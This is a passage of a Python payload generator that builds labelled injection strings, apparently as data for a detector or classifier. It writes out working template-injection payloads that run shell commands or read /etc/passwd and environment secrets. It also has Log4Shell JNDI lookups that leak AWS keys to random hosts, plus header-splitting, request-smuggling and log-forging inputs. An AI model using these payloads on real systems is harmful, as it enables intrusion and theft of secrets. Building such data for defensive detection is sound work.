            "{{#with \"s\" as |string|}}{{#with \"e\"}}{{#with split as |conslist|}}{{this.push (lookup string.sub \"constructor\")}}{{/with}}{{/with}}{{/with}}",
            "{{#with this}}{{lookup string.sub \"constructor\"}}{{/with}}",
            "{{this.constructor.constructor('return process')()}}",
            f"{{{{#each (lookup this 'constructor')}}}}{{{{/each}}}}",
        ))
    elif flavor == "pebble":
        s = rng.choice((
            f"{{{{ variable.getClass().forName('java.lang.Runtime').getRuntime().exec('{cmd}') }}}}",
            f"{{% set cmd = '{cmd}' %}}{{{{ [cmd]|first.getClass().forName('java.lang.Runtime') }}}}",
        ))
    elif flavor == "csti":
        s = rng.choice((
            "{{constructor.constructor('alert(1)')()}}", "{{$on.constructor('alert(1)')()}}",
            "{{_c.constructor('alert(1)')()}}", "{{$eval.constructor('alert(1)')()}}",
            "{{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };alert(1)//');}}",
            f"{{{{constructor.constructor('fetch(\"//{rand_host(rng)}\")')()}}}}",
            "{{[].pop.constructor('alert(1)')()}}", "<div v-html=\"''.constructor.constructor('alert(1)')()\">",
        ))
    elif flavor == "go":
        s = rng.choice(("{{.}}{{printf \"%s\" .Secret}}", "{{template \"" + rand_ident(rng, 2, 6) + "\"}}", "{{ .Request.Header }}",
                        "{{define \"T1\"}}ONE{{end}}{{template \"T1\"}}", "{{call .Exec \"" + cmd + "\"}}", "{{ os.Getenv \"SECRET\" }}"))
    elif flavor == "razor":
        s = rng.choice((f"@System.Diagnostics.Process.Start(\"cmd.exe\",\"/c {cmd}\")", f"@({rng.randint(2, 99)}*{rng.randint(2, 99)})",
                        "@{ var x = System.IO.File.ReadAllText(\"C:\\\\Windows\\\\win.ini\"); }@x"))
    elif flavor == "nunjucks":
        s = rng.choice((f"{{{{range.constructor(\"return global.process.mainModule.require('child_process').execSync('{cmd}')\")()}}}}",
                        f"{{{{ ''.constructor.constructor('return process.env')() }}}}"))
    elif flavor == "mvel":
        s = rng.choice((f"@{{Runtime.getRuntime().exec('{cmd}')}}", f"Runtime.getRuntime().exec('{cmd}')",
                        f"@{{java.lang.System.getenv()}}"))
    elif flavor == "slim":
        s = rng.choice((f"#{{`{cmd}`}}", f"#{{%x({cmd})}}", f"#{{File.read('/etc/passwd')}}"))
    elif flavor == "liquid":
        s = rng.choice(("{{ 'now' | date: '%Y' }}{% assign x = 7 | times: 7 %}{{x}}", "{% include '/etc/passwd' %}",
                        "{{ settings | json }}"))
    elif flavor == "lookup":
        s = rng.choice(("${env:AWS_SECRET_ACCESS_KEY}", "${sys:user.name}", "${env:PATH}", "${java:version}",
                        "${hostName}", "${main:0}", "${ctx:loginId}", "${sys:java.class.path}", "${env:DB_PASSWORD}"))
    else:  # jndi (Log4Shell), sometimes with nested lookups
        proto = rng.choice(("ldap", "ldap", "rmi", "dns", "ldaps", "iiop", "nis", "nds", "corba", "http"))
        host = rand_host(rng)
        if rng.random() < 0.3:
            host = rng.choice(("${env:USER}", "${sys:user.name}", "${hostName}", "${java:version}", "${env:AWS_ACCESS_KEY_ID}")) + "." + host
        if rng.random() < 0.3:
            host += ":%d" % rand_port(rng)
        path = rand_ident(rng, 1, 8)
        if rng.random() < 0.45:
            letters = list("jndi")
            tricks = (
                lambda c: f"${{lower:{c}}}", lambda c: f"${{upper:{c}}}", lambda c: f"${{::-{c}}}",
                lambda c: f"${{env:{rand_ident(rng, 2, 6).upper()}:-{c}}}", lambda c: f"${{date:'{c}'}}",
                lambda c: f"${{{rand_ident(rng, 1, 6)}:{rand_ident(rng, 1, 6)}:-{c}}}", lambda c: c,
            )
            word = "".join(rng.choice(tricks)(c) for c in letters)
            pr = rng.choice((proto, "".join(rng.choice(tricks)(c) for c in proto)))
            s = f"${{{word}:{pr}://{host}/{path}}}"
            mask |= M_OBFUSCATION
        else:
            s = f"${{{kw(rng, 'jndi') if rng.random() < 0.2 else 'jndi'}:{proto}://{host}/{path}}}"
    if _has_double_escape(s):
        mask |= M_OBFUSCATION
    return s.encode("utf-8"), mask


# --------------------------------------------------------------------------
# Header injection (CR/LF injection, response splitting, request smuggling)
# --------------------------------------------------------------------------

def _header_name(rng: random.Random, name: str) -> str:
    r = rng.random()
    if r < 0.75:
        return name
    if r < 0.9:
        return name.lower()
    return name.upper()


def _injected_header(rng: random.Random) -> str:
    host = rand_host(rng)
    name, value = pick(rng, (
        (("Set-Cookie", f"{rng.choice(benign.COOKIE_NAMES)}={rand_hex(rng, rng.choice((8, 16, 32)))}{rng.choice(('', '; HttpOnly', '; Path=/', '; Domain=' + host, '; Secure'))}"), 6),
        (("Set-Cookie", f"{rng.choice(('admin', 'role', 'is_admin', 'auth'))}={rng.choice(('true', '1', 'admin', 'yes'))}{rng.choice(('', '; Path=/'))}"), 3),
        (("Location", rand_url(rng)), 5),
        (("Content-Type", rng.choice(("text/html", "text/html; charset=utf-7", "application/javascript", "text/plain"))), 2),
        (("Content-Length", str(rng.randint(0, 200))), 3),
        (("Transfer-Encoding", rng.choice(("chunked", "identity", " chunked"))), 2),
        (("X-Forwarded-For", rng.choice(("127.0.0.1", "localhost", benign.ipv4(rng)))), 2),
        (("X-Forwarded-Host", host), 1), (("X-Original-URL", "/admin"), 1), (("X-Rewrite-URL", "/" + rand_word(rng)), 1),
        (("Host", host), 2), (("Refresh", f"0;url={rand_url(rng)}"), 2),
        (("Access-Control-Allow-Origin", rng.choice(("*", "https://" + host, "null"))), 1),
        (("Access-Control-Allow-Credentials", "true"), 1),
        (("Content-Security-Policy", rng.choice(("default-src *", "script-src 'unsafe-inline'"))), 1),
        (("X-XSS-Protection", "0"), 1), (("Cache-Control", rng.choice(("public, max-age=31536000", "no-store"))), 1),
        (("Link", f"<{rand_url(rng)}>; rel=preload"), 1), (("Authorization", f"Bearer {rand_hex(rng, 24)}"), 1),
        (("X-" + rand_ident(rng, 3, 8).capitalize(), rand_ident(rng, 1, 8)), 2), (("Content-Disposition", f"attachment; filename={rand_ident(rng, 2, 8)}.exe"), 1),
        (("Vary", "*"), 0), (("Connection", rng.choice(("close", "keep-alive", "Upgrade"))), 1),
        (("Upgrade", "h2c"), 1), (("Cookie", f"{rng.choice(benign.COOKIE_NAMES)}={rand_hex(rng, 16)}"), 1),
    ))
    colon = rng.choice((": ", ": ", ":", ":\t", " : "))
    return _header_name(rng, name) + colon + value


def _newline(rng: random.Random) -> Tuple[str, bool]:
    """A line break in raw or encoded form. Returns (text, obfuscated)."""
    return pick(rng, (
        (("\r\n", False), 10), (("%0d%0a", False), 10), (("%0D%0A", False), 5), (("\n", False), 4),
        (("%0a", False), 5), (("%0A", False), 2), (("\r", False), 1), (("%0d", False), 2), (("%0D%0a", False), 1),
        (("%0d%0a%09", False), 1), (("\r\n\t", False), 1), (("%0d%0a%20", False), 1),
        (("%250d%250a", True), 2), (("%25250d%25250a", True), 1), (("%E5%98%8A%E5%98%8D", True), 2),
        (("%u000d%u000a", True), 1), (("\\r\\n", True), 2), (("\\u000d\\u000a", True), 1), (("%c4%8d%c4%8a", True), 1),
    ))


def gen_header(rng: random.Random) -> Payload:
    mask = M_HEADER
    nl, obf = _newline(rng)
    if obf:
        mask |= M_OBFUSCATION
    host = rand_host(rng)
    prefix = pick(rng, (
        ("", 6), (rand_word(rng), 3), ("/" + rand_word(rng), 2), (str(rng.randint(1, 9999)), 1),
        (rand_url(rng), 2), ("/" + "/".join(rand_word(rng) for _ in range(rng.randint(1, 3))), 1),
        (benign.email(rng), 1), (rand_hex(rng, 16), 1), ("en-US", 1), (benign.ipv4(rng), 1),
    ))
    flavor = pick(rng, (("single", 8), ("multi", 3), ("split", 3), ("status", 2), ("smuggle", 2), ("smtp", 3),
                        ("folded", 1), ("log", 1)))
    if flavor == "single":
        s = prefix + nl + _injected_header(rng)
    elif flavor == "multi":
        s = prefix + "".join(nl + _injected_header(rng) for _ in range(rng.randint(2, 4)))
    elif flavor == "split":
        body = rng.choice(("<html>" + rand_word(rng) + "</html>", "<script>alert(1)</script>", rand_word(rng) + " " + rand_word(rng),
                           "<h1>" + rand_word(rng) + "</h1>", "{\"ok\":true}"))
        s = prefix + nl + _injected_header(rng) + nl + nl + body
        if "<script" in body:
            mask |= M_MARKUP
    elif flavor == "status":
        status = rng.choice(("HTTP/1.1 200 OK", "HTTP/1.1 302 Found", "HTTP/1.0 200 OK", "HTTP/1.1 401 Unauthorized"))
        s = prefix + nl + "Content-Length: 0" + nl + nl + status + nl + _injected_header(rng)
    elif flavor == "smuggle":
        method = rng.choice(("GET", "POST", "PUT", "DELETE", "HEAD"))
        path = rng.choice(("/admin", "/internal", "/" + rand_word(rng), "/api/" + rand_word(rng), "/"))
        s = prefix + nl + rng.choice(("Content-Length: 0", "Transfer-Encoding: chunked", "Content-Length: " + str(rng.randint(1, 99)))) + nl + nl
        s += rng.choice(("", "0" + nl + nl)) + f"{method} {path} HTTP/1.1" + nl + f"Host: {host}"
    elif flavor == "smtp":
        prefix = rng.choice((benign.email(rng), rand_word(rng), rand_word(rng) + " " + rand_word(rng), ""))
        hdr = rng.choice((f"Bcc: {rand_word(rng)}@{host}", f"Cc: {rand_word(rng)}@{host}", f"To: {rand_word(rng)}@{host}",
                          f"Subject: {rand_word(rng)}", f"Reply-To: {rand_word(rng)}@{host}", f"From: {rand_word(rng)}@{host}",
                          f"Content-Type: text/html", f"X-Mailer: {rand_word(rng)}"))
        s = prefix + nl + hdr
        if rng.random() < 0.5:
            s += nl + rng.choice(("Content-Type: text/html", f"Bcc: {rand_word(rng)}@{host}", "MIME-Version: 1.0"))
    elif flavor == "folded":
        s = prefix + nl + rng.choice((" ", "\t")) + _injected_header(rng)
    else:  # log: a forged line that looks like a new record
        s = prefix + nl + rng.choice((
            f"{benign.ipv4(rng)} - - [{rng.randint(1, 28)}/Nov/2026:10:{rng.randint(10, 59)}:00 +0000] \"GET /admin HTTP/1.1\" 200 {rng.randint(100, 9999)}",
            f"INFO User {rng.choice(('admin', 'root'))} logged in successfully",
            f"Set-Cookie: {rand_ident(rng, 2, 6)}={rand_hex(rng, 12)}",
        ))
    if _has_double_escape(s):
        mask |= M_OBFUSCATION
    return s.encode("utf-8"), mask


# Labels that depend on the shape of a payload, not on the grammar that made
# it, so that every generator labels the same shape the same way:
#
# - A reference to a well-known sensitive file by an absolute path, a file URL,
#   or `../` units is `path_traversal`, whichever attack carries it, such as
#   `load_file('/etc/passwd')` or `{% include '/etc/passwd' %}`.
# - A keyword split into concatenated strings, such as `top['al'+'ert']`, a
#   tab inside `javascript:`, or a `\x5f` escape is `obfuscation`.
_PATH_TARGETS = tuple(sorted({
    "/" + entry.lower().replace("\\", "/")
    for entry in SENSITIVE_FILES + WINDOWS_FILES
    if "/" in entry.replace("\\", "/")
}))
_SPLIT_KEYWORD = re.compile(r"""(['"`])[a-z_]{1,8}\1\s*\+\s*(['"`])[a-z_]{1,8}\2""", re.IGNORECASE)
_ESCAPED_KEYWORD = re.compile(r"java\tscript|\\x[0-9a-f]{2}", re.IGNORECASE)


def shape_labels(payload: bytes) -> int:
    """The category bits that the shape of `payload` implies."""
    text = payload.decode("utf-8", "replace").lower()
    mask = 0
    if any(target in text.replace("\\", "/") for target in _PATH_TARGETS):
        mask |= M_PATH
    if _SPLIT_KEYWORD.search(text) or _ESCAPED_KEYWORD.search(text):
        mask |= M_OBFUSCATION
    return mask


def _with_shape_labels(generator: Callable[[random.Random], Payload]) -> Callable[[random.Random], Payload]:
    @functools.wraps(generator)
    def wrapper(rng: random.Random) -> Payload:
        payload, mask = generator(rng)
        return payload, mask | shape_labels(payload)
    return wrapper


gen_sql = _with_shape_labels(gen_sql)
gen_markup = _with_shape_labels(gen_markup)
gen_path = _with_shape_labels(gen_path)
gen_cmd = _with_shape_labels(gen_cmd)
gen_template = _with_shape_labels(gen_template)
gen_header = _with_shape_labels(gen_header)

GENERATORS = {
    M_SQL: gen_sql,
    M_MARKUP: gen_markup,
    M_PATH: gen_path,
    M_CMD: gen_cmd,
    M_TEMPLATE: gen_template,
    M_HEADER: gen_header,
}


def families() -> List[str]:
    """Names of the categories that this module generates."""
    names = {M_SQL: "sql_injection", M_MARKUP: "markup_injection", M_PATH: "path_traversal",
             M_CMD: "command_injection", M_TEMPLATE: "template_injection", M_HEADER: "header_injection"}
    return [names[bit] for bit in GENERATORS]
